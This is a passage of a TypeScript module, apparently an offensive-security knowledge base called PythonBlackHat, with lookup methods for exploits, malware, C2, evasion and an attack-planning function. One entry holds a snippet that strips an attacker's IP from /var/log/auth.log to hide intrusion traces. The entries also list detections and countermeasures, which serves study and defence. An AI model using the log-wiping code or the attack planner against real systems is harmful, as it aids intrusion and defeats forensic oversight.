  add({ id: 'pytool-log-cleaner', name: 'Log File Cleaner', domain: 'forensics_evasion', description: 'Selective log entry removal — parse and filter syslog/auth.log/wtmp/lastlog entries matching attacker IP/username patterns', pythonLibraries: ['os', 're', 'struct'], codeTemplate: 'with open("/var/log/auth.log") as f: lines = [l for l in f if attacker_ip not in l]; open("/var/log/auth.log", "w").writelines(lines)', difficulty: 'intermediate', targetOS: 'linux', mitreTechnique: 'T1070.002 - Clear Linux or Mac System Logs', stealthRating: 0.6, reliability: 0.8, prerequisites: ['root_access'], detection: ['Log integrity monitoring', 'SIEM gap detection', 'File integrity monitoring'], countermeasures: ['Remote logging', 'Immutable logs', 'SIEM with gap detection'] });

  // RE tools
  add({ id: 'pytool-binary-analyzer', name: 'Binary Analysis Tool', domain: 'reverse_engineering', description: 'PE/ELF binary analysis — import/export tables, string extraction, entropy analysis, packer detection, disassembly', pythonLibraries: ['pefile', 'capstone', 'lief'], codeTemplate: 'pe = pefile.PE(path); for entry in pe.DIRECTORY_ENTRY_IMPORT: for imp in entry.imports: print(f"{entry.dll.decode()}: {imp.name.decode()}")', difficulty: 'intermediate', targetOS: 'cross_platform', mitreTechnique: 'T1027 - Obfuscated Files or Information', stealthRating: 0.9, reliability: 0.85, prerequisites: ['binary_file'], detection: ['Offline analysis — no detection'], countermeasures: ['Anti-disassembly', 'Packing', 'Obfuscation'] });

  return db;
}

// ── Main Class ───────────────────────────────────────────────────────────────

export class PythonBlackHat {
  private readonly config: PythonBlackHatConfig;
  private stats: PythonBlackHatStats;

  // Knowledge databases
  private readonly pythonLibraries: readonly PythonLibraryProfile[];
  private readonly exploitDevTechniques: readonly ExploitDevTechnique[];
  private readonly malwareTechniques: readonly MalwareTechnique[];
  private readonly networkAttacks: readonly NetworkAttack[];
  private readonly webExploits: readonly WebExploit[];
  private readonly reconTechniques: readonly ReconTechnique[];
  private readonly privEscPaths: readonly PrivEscPath[];
  private readonly c2Configs: readonly C2Config[];
  private readonly evasionMethods: readonly EvasionMethod[];
  private readonly pythonTools: readonly PythonTool[];

  constructor(config: Partial<PythonBlackHatConfig> = {}) {
    this.config = { ...DEFAULT_PYTHON_BLACKHAT_CONFIG, ...config };
    this.stats = {
      totalToolsGenerated: 0,
      totalExploitsCreated: 0,
      totalAttacksCrafted: 0,
      totalReconScans: 0,
      totalMalwareSamples: 0,
      totalEvasionTechniques: 0,
      totalC2Configs: 0,
      totalPrivEscPaths: 0,
      totalLookups: 0,
      feedbackCount: 0,
    };

    this.pythonLibraries = buildPythonLibraries();
    this.exploitDevTechniques = buildExploitDevTechniques();
    this.malwareTechniques = buildMalwareTechniques();
    this.networkAttacks = buildNetworkAttacks();
    this.webExploits = buildWebExploits();
    this.reconTechniques = buildReconTechniques();
    this.privEscPaths = buildPrivEscPaths();
    this.c2Configs = buildC2Configs();
    this.evasionMethods = buildEvasionMethods();
    this.pythonTools = buildPythonTools();
  }

  // ── Library Lookup ──

  findLibrary(name: string): PythonLibraryProfile | undefined {
    this.stats.totalLookups++;
    const lower = name.toLowerCase();
    return this.pythonLibraries.find(l =>
      l.name.toLowerCase() === lower || l.pipPackage.toLowerCase() === lower
    );
  }

  getLibrariesByDomain(domain: AttackDomain): PythonLibraryProfile[] {
    this.stats.totalLookups++;
    return this.pythonLibraries.filter(l => l.domain === domain);
  }

  getAllLibraries(): readonly PythonLibraryProfile[] {
    return this.pythonLibraries;
  }

  // ── Exploit Development ──

  getExploitDevTechnique(category: ExploitDevTechnique['category']): ExploitDevTechnique[] {
    this.stats.totalExploitsCreated++;
    return this.exploitDevTechniques.filter(t => t.category === category);
  }

  getExploitDevByDifficulty(difficulty: Difficulty): ExploitDevTechnique[] {
    return this.exploitDevTechniques.filter(t => t.difficulty === difficulty);
  }

  getAllExploitDevTechniques(): readonly ExploitDevTechnique[] {
    return this.exploitDevTechniques;
  }

  // ── Malware ──

  getMalwareTechnique(category: MalwareTechnique['category']): MalwareTechnique[] {
    this.stats.totalMalwareSamples++;
    return this.malwareTechniques.filter(t => t.category === category);
  }

  getMalwareByDifficulty(difficulty: Difficulty): MalwareTechnique[] {
    return this.malwareTechniques.filter(t => t.difficulty === difficulty);
  }

  getAllMalwareTechniques(): readonly MalwareTechnique[] {
    return this.malwareTechniques;
  }

  // ── Network Attacks ──

  getNetworkAttack(category: NetworkAttack['category']): NetworkAttack[] {
    this.stats.totalAttacksCrafted++;
    return this.networkAttacks.filter(a => a.category === category);
  }

  getNetworkAttacksByLayer(layer: NetworkAttack['targetLayer']): NetworkAttack[] {
    return this.networkAttacks.filter(a => a.targetLayer === layer);
  }

  getAllNetworkAttacks(): readonly NetworkAttack[] {
    return this.networkAttacks;
  }

  // ── Web Exploitation ──

  getWebExploit(category: WebExploit['category']): WebExploit[] {
    this.stats.totalAttacksCrafted++;
    return this.webExploits.filter(e => e.category === category);
  }

  getWebExploitsByOWASP(owaspCategory: string): WebExploit[] {
    const lower = owaspCategory.toLowerCase();
    return this.webExploits.filter(e => e.owaspCategory.toLowerCase().includes(lower));
  }

  getAllWebExploits(): readonly WebExploit[] {
    return this.webExploits;
  }

  // ── Reconnaissance ──

  getReconTechnique(category: ReconTechnique['category']): ReconTechnique[] {
    this.stats.totalReconScans++;
    return this.reconTechniques.filter(r => r.category === category);
  }

  getPassiveRecon(): ReconTechnique[] {
    return this.reconTechniques.filter(r => r.passiveOrActive === 'passive');
  }

  getActiveRecon(): ReconTechnique[] {
    return this.reconTechniques.filter(r => r.passiveOrActive === 'active');
  }

  getAllReconTechniques(): readonly ReconTechnique[] {
    return this.reconTechniques;
  }

  // ── Privilege Escalation ──

  getPrivEscPath(category: PrivEscPath['category']): PrivEscPath[] {
    this.stats.totalPrivEscPaths++;
    return this.privEscPaths.filter(p => p.category === category);
  }

  getPrivEscByPlatform(platform: TargetOS): PrivEscPath[] {
    return this.privEscPaths.filter(p => p.platform === platform || p.platform === 'cross_platform');
  }

  getAllPrivEscPaths(): readonly PrivEscPath[] {
    return this.privEscPaths;
  }

  // ── C2 Frameworks ──

  getC2Config(protocol: C2Config['protocol']): C2Config[] {
    this.stats.totalC2Configs++;
    return this.c2Configs.filter(c => c.protocol === protocol);
  }

  getStealthiestC2(minStealthRating?: number): C2Config[] {
    const threshold = minStealthRating ?? 0.7;
    return [...this.c2Configs]
      .filter(c => c.stealthRating >= threshold)
      .sort((a, b) => b.stealthRating - a.stealthRating);
  }

  getAllC2Configs(): readonly C2Config[] {
    return this.c2Configs;
  }

  // ── Evasion ──

  getEvasionMethod(category: EvasionMethod['category']): EvasionMethod[] {
    this.stats.totalEvasionTechniques++;
    return this.evasionMethods.filter(e => e.category === category);
  }

  getEvasionByDefense(defense: string): EvasionMethod[] {
    const lower = defense.toLowerCase();
    return this.evasionMethods.filter(e =>
      e.targetDefense.toLowerCase().includes(lower) || e.name.toLowerCase().includes(lower)
    );
  }

  getMostEffectiveEvasion(minEffectiveness?: number): EvasionMethod[] {
    const threshold = minEffectiveness ?? 0.6;
    return [...this.evasionMethods]
      .filter(e => e.effectiveness >= threshold)
      .sort((a, b) => b.effectiveness - a.effectiveness);
  }

  getAllEvasionMethods(): readonly EvasionMethod[] {
    return this.evasionMethods;
  }

  // ── Tools ──

  getTool(domain: AttackDomain): PythonTool[] {
    this.stats.totalToolsGenerated++;
    return this.pythonTools.filter(t => t.domain === domain);
  }

  getToolsByDifficulty(difficulty: Difficulty): PythonTool[] {
    return this.pythonTools.filter(t => t.difficulty === difficulty);
  }

  getToolsByOS(os: TargetOS): PythonTool[] {
    return this.pythonTools.filter(t => t.targetOS === os || t.targetOS === 'cross_platform');
  }

  getStealthiestTools(minStealthRating?: number): PythonTool[] {
    const threshold = minStealthRating ?? 0.7;
    return [...this.pythonTools]
      .filter(t => t.stealthRating >= threshold)
      .sort((a, b) => b.stealthRating - a.stealthRating);
  }

  getAllTools(): readonly PythonTool[] {
    return this.pythonTools;
  }

  // ── Attack Planning ──

  planAttack(target: string, objectives: string[]): {
    reconPhase: ReconTechnique[];
    exploitPhase: (WebExploit | NetworkAttack)[];
    privEscPhase: PrivEscPath[];
    persistPhase: C2Config[];
    evasionPhase: EvasionMethod[];
    tools: PythonTool[];
    estimatedDifficulty: Difficulty;
    totalSteps: number;
  } {
    const objStr = objectives.join(',').toLowerCase();
    const isWeb = objStr.includes('web') || target.includes('http');
    const isNetwork = objStr.includes('network') || objStr.includes('lan') || objStr.includes('internal');

    const recon = isWeb
      ? this.reconTechniques.filter(r => ['web_fingerprint', 'subdomain_enum', 'vuln_scan'].includes(r.category)).slice(0, 3)
      : this.reconTechniques.filter(r => ['port_scan', 'network_map', 'service_enum'].includes(r.category)).slice(0, 3);

    const exploits: (WebExploit | NetworkAttack)[] = isWeb
      ? this.webExploits.filter(e => ['sqli', 'rce', 'ssti', 'auth_bypass'].includes(e.category)).slice(0, 3)
      : this.networkAttacks.filter(a => ['arp_spoof', 'mitm', 'sniffing'].includes(a.category)).slice(0, 3);

    const privesc = isNetwork
      ? this.privEscPaths.filter(p => p.platform === 'linux').slice(0, 3)
      : this.privEscPaths.filter(p => p.platform === 'windows').slice(0, 3);

    const c2 = this.getStealthiestC2(0.7).slice(0, 2);
    const evasion = this.getMostEffectiveEvasion(0.6).slice(0, 3);

    const relevantTools = this.pythonTools
      .filter(t => {
        if (isWeb && (t.domain === 'web_exploitation' || t.domain === 'reconnaissance')) return true;
        if (isNetwork && (t.domain === 'network_attack' || t.domain === 'reconnaissance')) return true;
        return t.domain === 'evasion' || t.domain === 'c2_framework';
      }).slice(0, 5);

    const totalSteps = recon.length + exploits.length + privesc.length + c2.length + evasion.length;
    const estimatedDifficulty: Difficulty = totalSteps > 12 ? 'expert' : totalSteps > 8 ? 'advanced' : totalSteps > 4 ? 'intermediate' : 'beginner';

    this.stats.totalToolsGenerated++;

    return {
      reconPhase: recon,
      exploitPhase: exploits,
      privEscPhase: privesc,
      persistPhase: c2,
      evasionPhase: evasion,
      tools: relevantTools,
      estimatedDifficulty,
      totalSteps,
    };
  }

  // ── Knowledge Search ──

  searchKnowledge(query: string): {
    libraries: PythonLibraryProfile[];
    tools: PythonTool[];
    exploitDev: ExploitDevTechnique[];
    malware: MalwareTechnique[];
    networkAttacks: NetworkAttack[];
    webExploits: WebExploit[];
    recon: ReconTechnique[];
    privEsc: PrivEscPath[];
    c2: C2Config[];
    evasion: EvasionMethod[];
  } {
    const tokens = query.toLowerCase().split(/[\s,;:|_\-/\\]+/).filter(Boolean);
    this.stats.totalLookups++;

    const matchAny = (text: string): boolean =>
      tokens.some(t => text.toLowerCase().includes(t));

    return {
      libraries: this.pythonLibraries.filter(l => matchAny(l.name + ' ' + l.description + ' ' + l.keyFeatures.join(' '))),
      tools: this.pythonTools.filter(t => matchAny(t.name + ' ' + t.description + ' ' + t.domain)),
      exploitDev: this.exploitDevTechniques.filter(t => matchAny(t.name + ' ' + t.description + ' ' + t.category)),
      malware: this.malwareTechniques.filter(t => matchAny(t.name + ' ' + t.description + ' ' + t.category)),
      networkAttacks: this.networkAttacks.filter(a => matchAny(a.name + ' ' + a.description + ' ' + a.category)),
      webExploits: this.webExploits.filter(e => matchAny(e.name + ' ' + e.description + ' ' + e.category)),
      recon: this.reconTechniques.filter(r => matchAny(r.name + ' ' + r.description + ' ' + r.category)),
      privEsc: this.privEscPaths.filter(p => matchAny(p.name + ' ' + p.description + ' ' + p.category)),
      c2: this.c2Configs.filter(c => matchAny(c.name + ' ' + c.description + ' ' + c.protocol)),
      evasion: this.evasionMethods.filter(e => matchAny(e.name + ' ' + e.description + ' ' + e.category)),
    };
  }

  // ── Statistics ──

  getKnowledgeStats(): {
    totalLibraries: number;
    totalExploitDev: number;
    totalMalware: number;
    totalNetworkAttacks: number;
    totalWebExploits: number;
    totalRecon: number;
    totalPrivEsc: number;
    totalC2: number;
    totalEvasion: number;
    totalTools: number;
    totalKnowledgeItems: number;
  } {
    return {
      totalLibraries: this.pythonLibraries.length,
      totalExploitDev: this.exploitDevTechniques.length,
      totalMalware: this.malwareTechniques.length,
      totalNetworkAttacks: this.networkAttacks.length,
      totalWebExploits: this.webExploits.length,
      totalRecon: this.reconTechniques.length,
      totalPrivEsc: this.privEscPaths.length,
      totalC2: this.c2Configs.length,
      totalEvasion: this.evasionMethods.length,
      totalTools: this.pythonTools.length,
      totalKnowledgeItems: this.pythonLibraries.length + this.exploitDevTechniques.length +
        this.malwareTechniques.length + this.networkAttacks.length + this.webExploits.length +
        this.reconTechniques.length + this.privEscPaths.length + this.c2Configs.length +
        this.evasionMethods.length + this.pythonTools.length,
    };
  }

  // ── Serialization ──

  getStats(): Readonly<PythonBlackHatStats> {
    return { ...this.stats };
  }

  provideFeedback(): void {
    this.stats.feedbackCount++;
  }

  serialize(): string {
    return JSON.stringify({ config: this.config, stats: this.stats });
  }

  deserialize(json: string): void {
    const data = JSON.parse(json);
    if (data.stats) {
      Object.assign(this.stats, data.stats);
    }
  }
}
